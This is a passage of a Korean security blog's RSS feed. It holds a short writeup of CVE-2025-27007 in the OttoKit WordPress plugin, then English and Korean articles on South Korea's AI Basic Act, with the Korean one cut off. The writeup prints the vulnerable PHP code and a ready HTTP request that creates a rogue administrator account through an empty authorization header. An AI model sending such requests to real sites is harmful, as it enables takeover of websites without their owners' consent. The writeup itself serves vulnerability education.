id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/cve-2024-7344">https://nvd.nist.gov/vuln/detail/cve-2024-7344</a></li><li><a href="https://www.eset.com/blog/en/preparing-for-uefi-bootkits-eset-discovery-shows-the-importance-of-cyber-intelligence/">https://www.eset.com/blog/en/preparing-for-uefi-bootkits-eset-discovery-shows-the-importance-of-cyber-intelligence/</a></li><li><a href="https://x.com/pascal_gujer/status/1880025194254995636">https://x.com/pascal_gujer/status/1880025194254995636</a></li><li><a href="https://www.kb.cert.org/vuls/id/529659">https://www.kb.cert.org/vuls/id/529659</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Howyar/">Howyar</category>
      
      <category domain="https://hackyboiz.github.io/tags/UEFI-Reloader/">UEFI Reloader</category>
      
      <category domain="https://hackyboiz.github.io/tags/ACE/">ACE</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27007: WordPress OttoKit 플러그인의 Privilege Escalation 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/</link>
      <guid>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/</guid>
      <pubDate>Sun, 18 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://patchstack.com/articles/additional-critical-ottok</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://patchstack.com/articles/additional-critical-ottokit-formerly-suretriggers-vulnerability-patched">https://patchstack.com/articles/additional-critical-ottokit-formerly-suretriggers-vulnerability-patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OttoKit (&#xAD6C; SureTriggers) &#x2264; v1.0.82</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress&#xC758; &#xB370;&#xC774;&#xD130; &#xC790;&#xB3D9;&#xD654;&#x2027;&#xC5F0;&#xB3D9; &#xD50C;&#xB7EC;&#xADF8;&#xC778; OttoKit&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD574; WordPress &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>create_wp_connection</code> &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_wp_connection</span>(<span class="hljs-params"> $request </span>) </span>{$user_agent = $request-&gt;get_header( <span class="hljs-string">&apos;user-agent&apos;</span> );<span class="hljs-keyword">if</span> ( <span class="hljs-string">&apos;OttoKit&apos;</span> !== $user_agent &amp;&amp; <span class="hljs-string">&apos;SureTriggers&apos;</span> !== $user_agent ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Unauthorized&apos;</span>,],<span class="hljs-number">403</span>);}$params = $request-&gt;get_json_params();$username = <span class="hljs-keyword">isset</span>( $params[<span class="hljs-string">&apos;wp-username&apos;</span>] ) ? sanitize_text_field( $params[<span class="hljs-string">&apos;wp-username&apos;</span>] ) : <span class="hljs-string">&apos;&apos;</span>;$password = <span class="hljs-keyword">isset</span>( $params[<span class="hljs-string">&apos;wp-password&apos;</span>] ) ? $params[<span class="hljs-string">&apos;wp-password&apos;</span>] : <span class="hljs-string">&apos;&apos;</span>;<span class="hljs-keyword">if</span> ( <span class="hljs-keyword">empty</span>( $username ) || <span class="hljs-keyword">empty</span>( $password ) ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Username and password are required.&apos;</span>,],<span class="hljs-number">400</span>);}$user = wp_authenticate_application_password( <span class="hljs-literal">null</span>, $username, $password );<span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> ( is_wp_error( $user ) ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Invalid username or password.&apos;</span>,],<span class="hljs-number">403</span>);}$connection_status = $request-&gt;get_param( <span class="hljs-string">&apos;connection-status&apos;</span> );$access_key        = $request-&gt;get_param( <span class="hljs-string">&apos;sure-triggers-access-key&apos;</span> );$connected_email   = $request-&gt;get_param( <span class="hljs-string">&apos;connected_email&apos;</span> );<span class="hljs-keyword">if</span> ( <span class="hljs-literal">false</span> === $connection_status ) {$access_key = <span class="hljs-string">&apos;connection-denied&apos;</span>;}$connected_email_id = <span class="hljs-keyword">isset</span>( $connected_email ) ? sanitize_email( wp_unslash( $connected_email ) ) : <span class="hljs-string">&apos;&apos;</span>;<span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>( $access_key ) ) {SaasApiToken::save( $access_key );}OptionController::set_option( <span class="hljs-string">&apos;connected_email_key&apos;</span>, $connected_email_id );<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">true</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Connected successfully.&apos;</span>,],<span class="hljs-number">200</span>);}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>wp_authenticate_application_password</code> &#xD568;&#xC218;(<code>[1]</code>)&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; <code>is_wp_error</code>&#xB85C; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658;&#xAC12; <code>$user</code>&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC774;&#xC5C8;&#xB294;&#xC9C0; &#xC2E4;&#xD328;(&#xC5D0;&#xB7EC;)&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xB798;&#xC758; &#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <code>is_wp_error</code>&#xAC00; &#xC544;&#xB2C8;&#xB77C; <code>$user</code>&#xAC00; <code>WP_User</code>&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xC131;&#xACF5; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>is_wp_error</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xAE30;&#xC874; &#xBC29;&#xC2DD;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/18/pwndorei/2025-05-18/image.png" alt="image.png"></p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xAD00;&#xB9AC;&#xC790;&#xC758; username&#xB9CC; &#xC544;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; password&#xC640; access key&#xB85C; &#xC5F0;&#xACB0;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>/wp-json/sure-triggers/v1/automation/action</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs groovy">POST <span class="hljs-regexp">/wp-json/</span>sure-triggers<span class="hljs-regexp">/v1/</span>automation<span class="hljs-regexp">/action HTTP/</span><span class="hljs-number">1.1</span><span class="hljs-attr">Host:</span> victim.blogContent-<span class="hljs-attr">Type:</span> application/x-www-form-urlencodedSt-<span class="hljs-attr">Authorization:</span>selected_options[user_name]=pwned_admin&amp;selected_options[user_email]=evil<span class="hljs-meta">@hacker</span>.tld&amp;selected_options[password]=S3cureP<span class="hljs-meta">@ss</span>!&amp;selected_options[role]=administrator&amp;aintegration=WordPress&amp;type_event=create_user_if_not_exists</code></pre><p>&#xB610;&#xD55C; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xC9C1;&#xD6C4;&#xC758; &#xC0C1;&#xD0DC;&#xCC98;&#xB7FC; secret_key&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC704;&#xCC98;&#xB7FC; <code>St-Authorization</code> &#xD5E4;&#xB354;&#xC5D0; &#xBE48; &#xAC12;&#xC744; &#xB123;&#xAC8C; &#xB418;&#xBA74; &#xC544;&#xC608; &#xC778;&#xC99D;&#xACFC;&#xC815;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774;  &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Privilege-Escalation/">Privilege Escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/WordPress/">WordPress</category>
      
      <category domain="https://hackyboiz.github.io/tags/OttoKit/">OttoKit</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The AI Basic Act of South Korea(en)</title>
      <link>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/</link>
      <guid>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/</guid>
      <pubDate>Fri, 16 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/05/16/romi0x/ai_act_en/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello, romi0x!&lt;/p&gt;
&lt;p&gt;Today, I will explain the &lt;strong&gt;Artific</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/05/16/romi0x/ai_act_en/image.png" alt="image.png"></p><p>Hello, romi0x!</p><p>Today, I will explain the <strong>Artificial Intelligence Development and Trust-Based Foundation Act</strong> (referred to as the &#x201C;AI Basic Law&#x201D;), which is a South Korean law set to be implemented in January 2026.</p><h2 id="1-Overview-of-South-Korea&#x2019;s-AI-Basic-Law"><a href="#1-Overview-of-South-Korea&#x2019;s-AI-Basic-Law" class="headerlink" title="1. Overview of South Korea&#x2019;s AI Basic Law"></a>1. Overview of South Korea&#x2019;s AI Basic Law</h2><p>The <strong>AI Basic Law</strong> is a South Korean legislation aimed at promoting AI technology development and establishing a regulatory framework based on trust. It is the first law of its kind to be fully implemented globally, drawing international attention (the EU&#x2019;s AI law is set to be implemented in August 2026). This law aims to establish legal standards for regulation and promotion, as AI technology is becoming increasingly important across various industries.</p><h2 id="2-Global-AI-Legislation-Status"><a href="#2-Global-AI-Legislation-Status" class="headerlink" title="2. Global AI Legislation Status"></a>2. Global AI Legislation Status</h2><p>AI-related legislation is being actively developed around the world. The <strong>EU</strong> implemented the <strong>EU AI Act</strong>, the world&#x2019;s first comprehensive AI regulation, on August 1, 2024. The <strong>United States</strong> has also laid the legal groundwork through the <strong>National Artificial Intelligence Initiative Act 2020</strong> and the <strong>AI Innovation Act</strong>. South Korea has passed the <strong>AI Basic Law</strong>, with the law set to come into effect on January 22, 2026. This law, along with the EU AI Act, has garnered international attention as a significant step in the regulation and promotion of AI technology.</p><h2 id="3-Main-Purposes-of-South-Korea&#x2019;s-AI-Basic-Law"><a href="#3-Main-Purposes-of-South-Korea&#x2019;s-AI-Basic-Law" class="headerlink" title="3. Main Purposes of South Korea&#x2019;s AI Basic Law"></a>3. Main Purposes of South Korea&#x2019;s AI Basic Law</h2><p>The AI Basic Law has two main objectives:</p><p>First, to <strong>promote AI technology and related industries</strong> through the establishment of a government support system. The Minister of Science, Technology, and Information will develop a basic plan every three years to foster the development of AI technology, support small businesses and startups, and facilitate the construction and operation of AI data centers.</p><p>Second, to <strong>strengthen regulations</strong> on AI systems, including <strong>high-impact AI</strong> and <strong>generative AI</strong>. High-impact AI refers to systems that can have significant effects on life, health, property, and basic rights, particularly in industries such as <strong>energy, healthcare, transportation, and lending</strong>. Operators of these systems are required to establish transparency, safety, and risk management measures, and they will be subject to penalties such as fines for non-compliance.</p><h2 id="4-Key-Issues-and-Controversies"><a href="#4-Key-Issues-and-Controversies" class="headerlink" title="4. Key Issues and Controversies"></a>4. Key Issues and Controversies</h2><p>The key issues related to the AI Basic Law&#x2019;s enforcement regulations include &#x2460; the definition of high-impact AI, &#x2461; watermarking obligations, and &#x2462; government investigation powers.</p><h3 id="1-Definition-of-High-Impact-AI"><a href="#1-Definition-of-High-Impact-AI" class="headerlink" title="1) Definition of High-Impact AI"></a>1) Definition of High-Impact AI</h3><ul><li><strong>High-Impact AI</strong>: An AI system that can have significant effects on life, health, property, or basic rights.</li><li><strong>Generative AI</strong>: AI systems that generate various outputs such as text, images, etc.</li><li><strong>AI Industry</strong>: The industry that provides AI technology or related services.</li><li><strong>AI Operators</strong>: Entities such as corporations, individuals, or organizations engaged in the AI industry.</li></ul><p>There has been criticism regarding the vague definition of <strong>high-impact AI</strong> in the AI Basic Law. High-impact AI is primarily meant to refer to systems that can have significant impacts on industries like <strong>energy, healthcare, transportation, and lending</strong>. However, there is a lack of clear criteria for determining which AI systems fall under this category. For example, there is debate over whether AI used solely for credit score calculation in the lending industry should be classified as high-impact AI. Some businesses argue that high-impact AI should be categorized based on its <strong>usage</strong> rather than its function.</p><h3 id="2-Watermarking-Obligations"><a href="#2-Watermarking-Obligations" class="headerlink" title="2) Watermarking Obligations"></a>2) Watermarking Obligations</h3><ul><li><strong>Transparency Requirements (Article 31)</strong>:<ul><li>When providing products or services that use high-impact or generative AI systems, businesses must clearly inform users in advance. If an AI-generated output is provided, it must be marked as such, and users must be made aware of this, especially when the output closely resembles reality. Failure to comply can result in a fine of up to 30 million Korean won.</li></ul></li><li><strong>Safety Requirements (Article 32)</strong>:<ul><li>AI systems must identify and assess potential risks throughout their entire lifecycle (from development to disposal), and mitigation measures must be in place. AI systems that perform significant computations must adhere to stricter safety standards. In the event of a risk, businesses must have a response system and continuously monitor the system. Reports on compliance must be submitted regularly to the Minister of Science and ICT.</li></ul></li></ul><p>Concerns have been raised that the watermarking obligation could negatively affect creative activities, such as in the production of movies, webtoons, and animations. If watermarking is required for every AI-generated background image, it may diminish the quality and creative freedom in content production.</p><h3 id="3-Excessive-Government-Investigation-Powers"><a href="#3-Excessive-Government-Investigation-Powers" class="headerlink" title="3) Excessive Government Investigation Powers"></a>3) Excessive Government Investigation Powers</h3><p>The AI Basic Law grants the government the authority to review or certify high-impact AI businesses in advance. However, there are concerns about <strong>privacy breaches</strong> and <strong>cybersecurity threats</strong> arising from excessive investigations. It is necessary to establish clear guidelines to prevent unwarranted fact-finding or excessive verification.</p><h2 id="5-Comparison-with-the-EU-AI-Act"><a href="#5-Comparison-with-the-EU-AI-Act" class="headerlink" title="5. Comparison with the EU AI Act"></a>5. Comparison with the EU AI Act</h2><p>The <strong>AI Basic Act</strong> (K-AI Act) and the <strong>EU AI Act</strong> differ significantly in terms of regulatory targets, scope, and enforcement mechanisms. The EU AI Act classifies AI into <strong>four risk levels</strong>, applying granular and tiered regulations accordingly. In contrast, Korea&#x2019;s AI Basic Act regulates only <strong>high-impact AI</strong> and <strong>generative AI</strong>. The EU AI Act also stipulates much stricter penalties, including <strong>fines of up to 7% of global turnover</strong>, setting it apart from Korea&#x2019;s approach.</p><div class="table-container"><table><thead><tr><th>Category</th><th>EU AI Act</th><th>K-AI Act</th></tr></thead><tbody><tr><td><strong>Legislative Purpose</strong></td><td>Human-centered, protection of fundamental rights, promotion of trustworthy AI</td><td>Advancement of AI technologies and industries, securing global competitiveness</td></tr><tr><td><strong>Legislative Philosophy</strong></td><td><strong>Risk-based approach</strong>, focused on preemptive regulation</td><td><strong>Promotion-oriented approach</strong>, flexible regulatory structure</td></tr></tbody></table></div><p>The EU aims to protect <strong>fundamental rights</strong>, promote <strong>market integration</strong>, and ensure <strong>technological reliability</strong>, applying risk-differentiated regulation. In contrast, the K-AI Act focuses on the <strong>growth potential of the AI industry</strong>, emphasizing <strong>technology development and ecosystem activation</strong> through a more flexible regulatory framework.</p><ul><li><strong>EU AI Act: Comprehensive &amp; Sophisticated Classification System</strong><ul><li>AI systems are classified into <strong>four levels of risk</strong> (prohibited, high-risk, limited risk, minimal risk)</li><li>High-risk AI must meet requirements such as <strong>pre-market conformity assessment</strong>, <strong>technical documentation</strong>, <strong>log retention</strong>, and <strong>human oversight</strong></li><li>Examples: remote biometric identification, monitoring of students/workers, credit scoring, insurance pricing systems</li></ul></li><li><strong>K-AI Act: Focus on High-Impact &amp; Generative AI</strong><ul><li>Primarily manages &#x201C;high-impact AI&#x201D; and &#x201C;generative AI,&#x201D; though specific definitions remain ambiguous</li><li>Emphasizes <strong>voluntary and flexible regulation</strong> via guidelines and executive decrees rather than strict legal mandates</li></ul></li></ul><h2 id="6-Future-Challenges-and-the-Need-for-Input"><a href="#6-Future-Challenges-and-the-Need-for-Input" class="headerlink" title="6. Future Challenges and the Need for Input"></a>6. Future Challenges and the Need for Input</h2><p>The AI Basic Law is met with both positive expectations and critical concerns. On one hand, it is meaningful in that it provides a legal foundation for promoting AI technology and industry. On the other hand, there is criticism that the definition of high-risk AI is vague, and that important areas such as personal data and copyright protection remain insufficient. Therefore, it is important that relevant stakeholders actively participate in the process of drafting enforcement ordinances and guidelines to help supplement and refine the law&#x2019;s specific contents.</p><p>The author believes that one of the persistent issues is that policy always lags behind the pace of technological advancement. That said, hastily introducing laws and systems without proper preparation can also be dangerous. Once policy is in place, regulation inevitably follows&#x2014;and in turn, this could end up hindering technological growth. Especially in a field like AI, where rapid transformation and innovation are essential, overly restrictive regulations may cause the country to fall behind in global competition.</p><p>So here&#x2019;s a question for you, the reader:</p><p><strong>&#x201C;Is it possible for regulation to keep up with the speed of technology?&#x201D;</strong></p><p><strong>&#x201C;If not, should we allow technology to progress first and address problems afterward?&#x201D;</strong></p><p><strong>&#x201C;Between technological advancement and public safety, which should take priority?&#x201D;</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1">https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1</a><br><a href="https://www.skshieldus.com/blog-security/security-trend-idx50">https://www.skshieldus.com/blog-security/security-trend-idx50</a><br><a href="https://v.daum.net/v/20250418162437559">https://v.daum.net/v/20250418162437559</a><br><a href="https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461">https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461</a><br><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a><br><a href="https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1">https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/ai/">ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/aiAct/">aiAct</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 인공지능기본법(ko)</title>
      <link>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/</link>
      <guid>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/</guid>
      <pubDate>Fri, 16 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/05/16/romi0x/ai_act_ko/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! romi0x&amp;#xC785;&amp;#xB2C8</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/05/16/romi0x/ai_act_ko/image.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! romi0x&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC624;&#xB298;&#xC740; &#xB0B4;&#xB144; 1&#xC6D4; &#xC2DC;&#xD589;&#xC608;&#xC815;&#xC778; <a href="https://www.law.go.kr/%EB%B2%95%EB%A0%B9/%EC%9D%B8%EA%B3%B5%EC%A7%80%EB%8A%A5%20%EB%B0%9C%EC%A0%84%EA%B3%BC%20%EC%8B%A0%EB%A2%B0%20%EA%B8%B0%EB%B0%98%20%EC%A1%B0%EC%84%B1%20%EB%93%B1%EC%97%90%20%EA%B4%80%ED%95%9C%20%EA%B8%B0%EB%B3%B8%EB%B2%95/(20676,20250121"><strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xBC1C;&#xC804;&#xACFC; &#xC2E0;&#xB8B0; &#xAE30;&#xBC18; &#xC870;&#xC131; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xAE30;&#xBCF8;&#xBC95;(&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;)</strong></a>)&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;-&#xAC1C;&#xC694;"><a href="#1-&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;-&#xAC1C;&#xC694;" class="headerlink" title="1. &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95; &#xAC1C;&#xC694;"></a>1. &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95; &#xAC1C;&#xC694;</h2><p><strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;</strong>&#xC740; 2026&#xB144; 1&#xC6D4; 22&#xC77C; &#xC2DC;&#xD589;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC81C;&#xC815;&#xB41C; &#xB300;&#xD55C;&#xBBFC;&#xAD6D;&#xC758; &#xBC95;&#xB960;&#xB85C;, AI &#xAE30;&#xC220;&#xC758; &#xBC1C;&#xC804;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; &#xC2E0;&#xB8B0;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xADDC;&#xC81C; &#xCCB4;&#xACC4;&#xB97C; &#xAD6C;&#xCD95;&#xD558;&#xB294; &#xB370; &#xC911;&#xC810;&#xC744; &#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xCD08;&#xB85C; &#xC804;&#xBA74; &#xC2DC;&#xD589;&#xB418;&#xB294; AI &#xAE30;&#xBCF8;&#xBC95;&#xC73C;&#xB85C; &#xC804; &#xC138;&#xACC4;&#xC758; &#xC8FC;&#xBAA9;&#xC744; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(EU&#xB294; 2026&#xB144; 8&#xC6D4; &#xC2DC;&#xD589; &#xC608;&#xC815;) AI &#xAE30;&#xC220;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC0B0;&#xC5C5; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xAC8C; &#xB428;&#xC5D0; &#xB530;&#xB77C; &#xADDC;&#xC81C;&#xC640; &#xC9C4;&#xD765;&#xC744; &#xC704;&#xD55C; &#xBC95;&#xC801; &#xAE30;&#xC900;&#xC744; &#xB9C8;&#xB828;&#xD558;&#xB294; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="2-AI&#xBC95;-&#xAE00;&#xB85C;&#xBC8C;-&#xD604;&#xD669;"><a href="#2-AI&#xBC95;-&#xAE00;&#xB85C;&#xBC8C;-&#xD604;&#xD669;" class="headerlink" title="2. AI&#xBC95; &#xAE00;&#xB85C;&#xBC8C; &#xD604;&#xD669;"></a>2. AI&#xBC95; &#xAE00;&#xB85C;&#xBC8C; &#xD604;&#xD669;</h2><p>&#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; AI &#xAD00;&#xB828; &#xBC95;&#xC81C;&#xD654;&#xAC00; &#xD65C;&#xBC1C;&#xD788; &#xC9C4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>EU</strong>&#xB294; 2024&#xB144; 8&#xC6D4; 1&#xC77C;, &#xC804; &#xC138;&#xACC4; &#xCD5C;&#xCD08;&#xB85C; &#xD3EC;&#xAD04;&#xC801;&#xC778; AI &#xADDC;&#xC81C;&#xB97C; &#xB3C4;&#xC785;&#xD55C; <strong>EU &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xBC95;</strong>&#xC744; &#xC2DC;&#xD589;&#xD588;&#xC73C;&#xBA70;, <strong>&#xBBF8;&#xAD6D;</strong>&#xC740; <strong>&#xAD6D;&#xAC00; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAD6C;&#xC0C1;&#xBC95; 2020</strong>&#xACFC; <strong>&#xBBF8;&#xAD6D; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC9C4;&#xD765;&#xBC95;</strong> &#xB4F1;&#xC744; &#xD1B5;&#xD574; AI &#xAD00;&#xB828; &#xBC95;&#xC801; &#xD2C0;&#xC744; &#xB9C8;&#xB828;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xD55C;&#xBBFC;&#xAD6D;&#xB3C4; <strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;</strong>&#xC744; &#xD1B5;&#xACFC;&#xC2DC;&#xCF30;&#xACE0;, 2026&#xB144; 1&#xC6D4; &#xC2DC;&#xD589;&#xC744; &#xC55E;&#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; AI &#xAE30;&#xC220;&#xC758; &#xADDC;&#xC81C; &#xBC0F; &#xC9C4;&#xD765;&#xC744; &#xC704;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xBC95;&#xC801; &#xC2DC;&#xB3C4;&#xB85C;, EU AI&#xBC95;&#xACFC; &#xD568;&#xAED8; &#xAD6D;&#xC81C;&#xC801;&#xC73C;&#xB85C; &#xD070; &#xAD00;&#xC2EC;&#xC744; 